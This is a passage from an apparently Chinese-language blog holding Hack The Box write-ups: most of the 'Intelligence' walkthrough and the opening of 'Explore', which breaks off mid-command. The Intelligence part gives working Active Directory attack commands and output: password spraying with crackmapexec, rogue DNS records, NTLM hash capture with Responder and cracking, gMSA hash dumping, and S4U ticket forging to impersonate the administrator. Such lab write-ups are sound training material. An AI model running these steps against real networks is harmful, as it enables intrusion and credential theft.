any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 648.79 seconds\n```\n在上面我们得到的重要信息有：\n\n- 开启80端口的HTTP服务\n- 开启SMB服务 \n- 有两个域名`intelligence.htb`和`dc.intelligence.htb` \n- 有`Kerberos`可能涉及内网渗透\n\n咱们一个一个来看，首先先把域名添加到hosts里\n\n```Plain Text\necho 10.10.10.248 dc.intelligence.htb intelligence.htb > /etc/hosts\n```\n然后咱们去查看一下这两个域名\n\n这两个域名的内容似乎是一样的，找到了两个PDF文件\n\n```Plain Text\nhttp://intelligence.htb/documents/2020-12-15-upload.pdf\nhttp://intelligence.htb/documents/2020-01-01-upload.pdf\n```\n翻译后没看到什么有用的信息，但毕竟是PDF文件，咱们使用`exiftool`进行查看\n\n```Plain Text\nexiftool 2020-01-01-upload.pdf\n```\n![](Hackthebox-Intelligence/0b06ca38-286b-4cce-b25e-2e71021ff83d.png)\n\n```Plain Text\nexiftool 2020-12-15-upload.pdf\n```\n![](Hackthebox-Intelligence/557cee9f-1385-41ab-96de-a13577a24dfc.png)\n\n在PDF文件中读取到了一个名为`Creator`的字段，这个一般不是正常情况，先记录一下吧。\n\n```Plain Text\nWilliam.Lee\nJose.Williams\n```\n这个可能是两个用户名\n\n我们观察一下这两个pdf文件的命名规则，会发现，变动的只有日期。那么，是否还有其他的pdf文件呢？让我们测试一下\n\n![](Hackthebox-Intelligence/ee74b2f4-0616-465e-8113-87e5240183cf.png)\n\n可以看到，确实是存在的。\n\n然后，我找到了一个脚本，感谢`kavigihan`师傅写的脚本\n\n```Plain Text\n#!/usr/bin/python3\n# Author: kavigihan\n\nimport requests\nimport os\n\ndef fuzz_PDFs():\n    with open('days', 'r') as d:\n        days = d.readlines()\n\n    with open('months' ,'r') as m:\n        months = m.readlines()\n\n    url_file = open('urls', 'w')\n    url_file.close()\n\n    for month in months:\n        for day in days:\n            r = requests.get(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')\n            if int(r.status_code) == 200:\n                print(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')\n\n                with open('urls', 'a') as url_file:\n                    url_file.write(f'http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf')\n                    url_file.write('\\n')\n\ndef get_PDFs():\n    with open('urls', 'r') as u:\n        urls = u.readlines()\n\n    for url in urls:\n        os.system(f\"wget -q {url.strip()} \")\n        print(f'[+] Downloading -- {url.strip()} ')\n\nfuzz_PDFs()\nget_PDFs()\n```\n保存到本地，然后生成两个字典\n\n```Plain Text\nseq 1 31 > days; seq 1 12 > months\n```\n记得手动在生成出来的字典内，把1-9添加上0，比如1月就改为01月\n\n然后执行该脚本\n\n```Plain Text\npython3 exploit.py\n```\n使用命令\n\n```Plain Text\ncat *.pdf|strings |grep Creator|cut -d '(' -f 2|cut -d ')' -f 1|grep -v TeX > users;cat users\n```\n提权pdf文件内的用户名\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# cat *.pdf|strings |grep Creator|cut -d '(' -f 2|cut -d ')' -f 1|grep -v TeX > users;cat users\nWilliam.Lee\nScott.Scott\nJason.Wright\nVeronica.Patel\nJose.Williams\nBrian.Morris\nJennifer.Thomas\nThomas.Valenzuela\nDavid.Mcbride\nJose.Williams\nAnita.Roberts\nBrian.Baker\nJose.Williams\nDavid.Mcbride\nDavid.Reed\nKaitlyn.Zimmerman\nJason.Patterson\nThomas.Valenzuela\nDavid.Mcbride\nDarryl.Harris\nDavid.Wilson\nScott.Scott\nTeresa.Williamson\nJohn.Coleman\nSamuel.Richardson\nIan.Duncan\nJason.Wright\nTravis.Evans\nDavid.Mcbride\nJessica.Moody\nIan.Duncan\nAnita.Roberts\nKaitlyn.Zimmerman\nJose.Williams\nStephanie.Young\nSamuel.Richardson\nTiffany.Molina\nIan.Duncan\n```\n接着在文件`2020-06-04-upload.pdf`中发现了一个默认密码\n\n```Plain Text\nNew Account Guide\nWelcome to Intelligence Corp!\nPlease login using your username and the default password of:\nNewIntelligenceCorpUser9876\nAfter logging in please change your password as soon as possible.\n```\n使用exiftool查看该pdf，获得了用户名`Jason.Patterson`，这样我们就有了一个账户密码\n\n```Plain Text\nusername = Jason.Patterson\npassword = NewIntelligenceCorpUser9876\n```\n咱们直接使用smb进行登录\n\n```Plain Text\nsmbclient -L //10.10.10.248 -U Tiffany.Molina\n```\n但当我尝试登录的时候，却提示我失败了。估计是账户密码不匹配，没办法，只能爆破一波了\n\n```Plain Text\n使用crackmapexec进行爆破\ncrackmapexec smb 10.10.10.248 -u users -p “NewIntelligenceCorpUser9876”\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876\n[*] Initializing LDAP protocol database\n[*] Generating SSL certificate\nSMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE\nSMB         10.10.10.248    445    DC               [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876\n```\n成功获得正确的smb账号和密码\n\n```Plain Text\nusername = Tiffany.Molina\npassword = NewIntelligenceCorpUser9876\n```\n登录smb进行查看\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# smbclient -L //10.10.10.248 -U Tiffany.Molina\nEnter WORKGROUP\\Tiffany.Molina's password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        IT              Disk\n        NETLOGON        Disk      Logon server share\n        SYSVOL          Disk      Logon server share\n        Users           Disk\nSMB1 disabled -- no workgroup available\n```\n登录成功，咱们查找一下看看有没有什么可利用的文件吧\n\n可以查看的就`IT`和`Users`目录，咱们分别去查看一下\n\n```Plain Text\nsmbclient //10.10.10.248/IT -U Tiffany.Molina\nsmbclient //10.10.10.248/Users -U Tiffany.Molina\n```\n在IT目录下找到了一个ps1的文件\n\n```Plain Text\n──(root💀root)-[~/Desktop]\n└─# smbclient //10.10.10.248/IT -U Tiffany.Molina                                                                                                                                                           130 ⨯\nEnter WORKGROUP\\Tiffany.Molina's password:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Mon Apr 19 08:50:55 2021\n  ..                                  D        0  Mon Apr 19 08:50:55 2021\n  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021\n\n                3770367 blocks of size 4096. 1330536 blocks available\nsmb: \\> get downdetector.ps1\ngetting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)\n```\n先下载下来，咱们去看看users目录\n\n在`Users\\Tiffany.Molina\\Desktop`下找到了user.txt文件\n\n```Plain Text\nsmb: \\Tiffany.Molina\\Desktop\\> get user.txt\ngetting file \\Tiffany.Molina\\Desktop\\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# cat user.txt                                                                                                                                                                                              1 ⚙\n6d148717e36be40a48439bdf34ea3054\n```\n成功获得user权限的flag文件\n\n## 漏洞利用\n查看一下`downdetector.ps1`文件的内容\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# cat downdetector.ps1                                                                                                                                                                                      1 ⚙\n��# Check web server status. Scheduled to run every 5min\nImport-Module ActiveDirectory\nforeach($record in Get-ChildItem \"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\" | Where-Object Name -like \"web*\")  {\ntry {\n$request = Invoke-WebRequest -Uri \"http://$($record.Name)\" -UseDefaultCredentials\nif(.StatusCode -ne 200) {\nSend-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject \"Host: $($record.Name) is down\"\n}\n} catch {}\n}\n```\n我们解读一下该文件的内容，每五分钟，它会检查以“web”开头的域`intelligence.htb`的任何DNS记录，并使用`Ted`的凭据为每个找到的域发送HTTP请求。(使用`-UseDefaultCredentials`选项)如果服务器没有返回200 OK状态码，则会向`Ted`发送一封邮件。\n\n我们要做的是使用`dnstool.py`添加一个从web开始不存在的假VHOST到zone。这样就会触发脚本向`Ted`发送邮件。 > https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py\n\n```Plain Text\npython3 dnstool.py -u 'intelligence.htb\\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'weboops.intelligence.htb' -d 10.10.14.40 10.10.10.248\n10.10.14.40 是我们本地的IP\n10.10.10.248 是靶机的IP\n```\n该脚本会向我们发送电子邮件，因此我们使用`responder`来进行嗅探并捕获`Ted`用户的密码Hash值\n\n```Plain Text\nresponder -I tun0 -A\n```\n执行后，由于该脚本每五分钟检查一次，所以咱们需要等等\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# responder -I tun0 -A\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.0.2.0\n\n  Author: Laurent Gaffie (laurent.gaffie@gmail.com)\n  To kill this script hit CTRL-C\n\n[+] Poisoners:\n    LLMNR                      [ON]\n    NBT-NS                     [ON]\n    DNS/MDNS                   [ON]\n\n[+] Servers:\n    HTTP server                [ON]\n    HTTPS server               [ON]\n    WPAD proxy                 [OFF]\n    Auth proxy                 [OFF]\n    SMB server                 [ON]\n    Kerberos server            [ON]\n    SQL server                 [ON]\n    FTP server                 [ON]\n    IMAP server                [ON]\n    POP3 server                [ON]\n    SMTP server                [ON]\n    DNS server                 [ON]\n    LDAP server                [ON]\n    RDP server                 [ON]\n\n[+] HTTP Options:\n    Always serving EXE         [OFF]\n    Serving EXE                [OFF]\n    Serving HTML               [OFF]\n    Upstream Proxy             [OFF]\n\n[+] Poisoning Options:\n    Analyze Mode               [ON]\n    Force WPAD auth            [OFF]\n    Force Basic Auth           [OFF]\n    Force LM downgrade         [OFF]\n    Fingerprint hosts          [OFF]\n\n[+] Generic Options:\n    Responder NIC              [tun0]\n    Responder IP               [10.10.14.40]\n    Challenge set              [random]\n    Don't Respond To Names     ['ISATAP']\n\n[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.\n[Analyze mode: ICMP] You can ICMP Redirect on this network.\n[Analyze mode: ICMP] This workstation (10.10.14.40) is not on the same subnet than the DNS server (192.168.72.2).\n[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.\n[+] Listening for events...\n[HTTP] NTLMv2 Client   : 10.10.10.248\n[HTTP] NTLMv2 Username : intelligence\\Ted.Graves\n[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:0daa3ec1b284an```\n成功捕获hash，咱们保存到本地\n\n咱们这里使用john进行hash爆破，大家也可以使用其他工具，比如hashcat\n\n```Plain Text\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n```\n爆破完以后查看hash.txt\n\n```Plain Text\njohb --show hash.txt\n```\n成功获得账号密码\n\n```Plain Text\nusername = Ted.Graves\npassword = Mr.Teddy\n```\n我们成功拿到了Ted的账户密码，所以我们尝试将用户共享挂载为Ted并枚举\n\n```Plain Text\nmkdir mount ;sudo mount //10.10.10.248/Users mount/ -o username=”Ted.Graves”,password=”Mr.Teddy”\n```\n可惜的是，并没有什么有用的东西，苦于没有思路，我又去检查了一遍之前找到的文件，在`2020-12-30-upload.pdf`中，还真发现了点东西\n\n```Plain Text\nInternal IT Update\n\nThere has recently been some outages on our web servers. Ted has gotten ascript in place to help notify us if this happens again.Also, after discussion following our recent security audit we are in the processof locking down our service accounts.\n```\n大致意思就是说他们还没有锁定服务账户。通过Google查找后发现，如果启用了服务账户，那我们可以使用`gMASDumper.py`转储Hash值。\n\n## 权限提升\n> https://github.com/micahvandeusen/gMSADumper\n\n咱们使用这个脚本为Ted获取一个NTHash\n\n```Plain Text\npython3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop/gMSADumper]\n└─# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb\nsvc_int$:::d64b83fe606e6d3005e20ce0ee932fe2\n```\n有了这个之后，咱们可以做PTT（Pass The Ticket）攻击。\n\n咱们使用ntpdate进行利用\n\n```Plain Text\nntpdate 10.10.10.248\n```\n如果运行后时间没有更改，使用以下方法解决\n\n```Plain Text\napt-get install chrony\ntimedatectl set-ntp true\nntpdate 10.10.10.248\n```\n使用python自带的getST.py以管理员身份获取票据，以便于我们以用户身份运行命令\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop/gMSADumper]\n└─# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator                   127 ⨯\nImpacket v0.9.21 - Copyright 2020 SecureAuth Corporation\n\n[*] Getting TGT for user\n[*] Impersonating administrator\n[*]     Requesting S4U2self\n[*]     Requesting S4U2Proxy\n[*] Saving ticket in administrator.ccache\n```\n票据已保存为`administrator.ccache`，有了这个票据，我们就可以使用各种工具进行利用了 使用`export`来将票据作为环境变量\n\n```Plain Text\nexport KRB5CCNAME=administrator.ccache\n```\n这里我们继续使用python的工具`smbclient.py`进行利用\n\n```Plain Text\npython3 /usr/share/doc/python3-impacket/examples/smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass\n```\n进入后，我们就成功使用smbclient.py登录到smb里了\n\n进入后，咱们获取root权限的flag文件即可\n\n```Plain Text\nshares\nuse Users\nls\ncd Administrator\ncd Desktop\nget root.txt\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# cat root.txt\n69f9f1591b2d1701721d539a138c3ce9\n```\n成功获得root权限的flag文件\n\n收工睡觉","tags":["Hackthebox"]},{"title":"Explore - Hackthebox","url":"/2021/07/06/Hackthebox/Easy/Hackthebox-Explore/","content":"\n# Hackthebox - Explore\n## 靶场信息\n![](Hackthebox-Explore/ef2eeeb2-22d0-44ce-8923-e1ba9b893bd4.jpg)\n\n## 靶场类型\n![](Hackthebox-Explore/f5360e65-dcdf-40a4-bf21-e4bb6c44d51a.jpg)\n\n## 信息搜集\n首先使用nmap进行信息搜集\n\nnmap -A -sS -sC -sV -p- 10.10.10.247\n\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─# nmap -A -sS -sC -sV -p- 10.10.10.247\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 17:01 CST\nNmap scan report for explore.htb (10.10.10.247)\nHost is up (0.25s latency).\nNot shown: 65530 closed ports\nPORT      STATE    SERVICE VERSION\n2222/tcp  open     ssh     (protocol 2.0)\n| fingerprint-strings:\n|   NULL:\n|_    SSH-2.0-SSH Server - Banana Studio\n| ssh-hostkey:\n|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)\n5555/tcp  filtered freeciv\n38237/tcp open     unknown\n| fingerprint-strings:\n|   GenericLines:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:06 GMT\n|     Content-Length: 22\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|   GetRequest:\n|     HTTP/1.1 412 Precondition Failed\n|     Date: Tue, 06 Jul 2021 09:28:06 GMT\n|     Content-Length: 0\n|   HTTPOptions:\n|     HTTP/1.0 501 Not Implemented\n|     Date: Tue, 06 Jul 2021 09:28:11 GMT\n|     Content-Length: 29\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Method not supported: OPTIONS\n|   Help:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:28 GMT\n|     Content-Length: 26\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line: HELP\n|   RTSPRequest:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:11 GMT\n|     Content-Length: 39\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     valid protocol version: RTSP/1.0\n|   SSLSessionReq:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:28 GMT\n|     Content-Length: 73\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|     ?G???,???`~?\n|     ??{????w????<=?o?\n|   TLSSessionReq:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:29 GMT\n|     Content-Length: 71\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|     ??random1random2random3random4\n|   TerminalServerCookie:\n|     HTTP/1.0 400 Bad Request\n|     Date: Tue, 06 Jul 2021 09:28:29 GMT\n|     Content-Length: 54\n|     Content-Type: text/plain; charset=US-ASCII\n|     Connection: Close\n|     Invalid request line:\n|_    Cookie: mstshash=nmap\n42135/tcp open     http    ES File Explorer Name Response httpd\n|_http-server-header: ES Name Response Server\n|_http-title: Site doesn't have a title (text/html).\n59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older\n|_http-title: Site doesn't have a title (text/plain).\n2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port2222-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(NUL\nSF:L,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port38237-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,AA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x200\nSF:6\\x20Jul\\x202021\\x2009:28:06\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nContent\nSF:-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\nSF:\\nInvalid\\x20request\\x20line:\\x20\")%r(GetRequest,5C,\"HTTP/1\\.1\\x20412\\x\nSF:20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28\nSF::06\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,B5,\"HTTP/1\\.\nSF:0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2\nSF:009:28:11\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/plai\nSF:n;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x20\nSF:supported:\\x20OPTIONS\")%r(RTSPRequest,BB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Re\nSF:quest\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:11\\x20GMT\\r\\nConte\nSF:nt-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\\nSF:nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version:\\\nSF:x20\\x20RTSP/1\\.0\")%r(Help,AE,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDat\nSF:e:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x\nSF:2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\nSF:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\")%r(SSLSessionReq,\nSF:DD,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x2\nSF:02021\\x2009:28:28\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\x\nSF:20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\?\\\nSF:0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?<=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\")%r(TerminalSer\nSF:verCookie,CA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x2006\nSF:\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nContent-\nSF:Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\\nSF:nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mstsh\nSF:ash=nmap\")%r(TLSSessionReq,DB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDa\nSF:te:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28:29\\x20GMT\\r\\nContent-Length:\\\nSF:x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection\nSF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0e\nSF:\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/6%OT=2222%CT=1%CU=35534%PV=Y%DS=2%DC=T%G=Y%TM=60E41F\nOS:BE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SE\nOS:Q(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW6%O2=M54DST11NW6%\nOS:O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11NW6%O6=M54DST11)WIN(W1=FFFF%W2\nOS:=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNNS\nOS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Device: phone\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT       ADDRESS\n1   253.69 ms 10.10.14.1\n2   253.76 ms explore.htb (10.10.10.247)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 979.56 seconds\n\n```\n咱们发现，分别在`38237`、`42135`和`59777`上运行了HTTP服务\n\n咱们分别去看看\n\n![](Hackthebox-Explore/a2e1c391-fb11-40b2-b6d5-c21779dab50c.jpg)\n\n这边提示是空响应？那做个fuzz看看\n\n```Plain Text\nffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e .php,.html\n```\n```Plain Text\n┌──(root💀root)-[~/Desktop]\n└─#  ffuf -u http://10.10.10.247:59777/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 100 -e 